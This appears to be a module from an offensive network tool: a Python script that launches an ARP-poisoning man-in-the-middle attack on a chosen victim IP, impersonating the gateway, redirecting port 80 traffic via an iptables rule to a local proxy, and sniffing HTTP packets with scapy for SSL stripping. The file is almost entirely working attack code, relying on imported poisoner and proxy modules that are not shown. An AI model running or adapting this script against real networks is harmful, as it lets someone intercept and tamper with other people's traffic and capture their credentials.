import os
import threading
import time
from scapy.all import *
from attacks.arp_poison import ArpPoisoner
from utils import get_gateway_ip
from utils.network_utils import get_mac_address
from utils.proxy_server import start_http_server

def run(args):
    interface = args.interface
    victim_ip = args.victim_ip

    # Spoof the gateway router
    gateway_ip = get_gateway_ip.find_gateway_ip()
    args.gateway_ip = gateway_ip
    args.gateway_mac = get_mac_address(gateway_ip, interface=args.interface)
    stop_event = threading.Event()

    try:
        # Start the HTTP server
        start_http_server()

        # Set up iptables for rerouting HTTP packets
        os.system("iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080")

        poisoner = ArpPoisoner(args)
        arp_poison_thread = threading.Thread(target=poisoner.start)
        arp_poison_thread.setDaemon(True)
        arp_poison_thread.start()

        start_sniffing(interface)

        while not stop_event.is_set():
            time.sleep(0.5)

    except (KeyboardInterrupt, SystemExit):
        print("[-] Interrupted, joining threads...")
        stop_event.set()
        poisoner.stop()

        os.system("iptables -t nat -D PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080")

        arp_poison_thread.join()

def start_sniffing(interface):
    sniff(iface=interface, filter="tcp port 80", store=False, prn=ssl_strip)

def ssl_strip(packet):
    pass  # No need to implement this as the HTTP server handles the requests
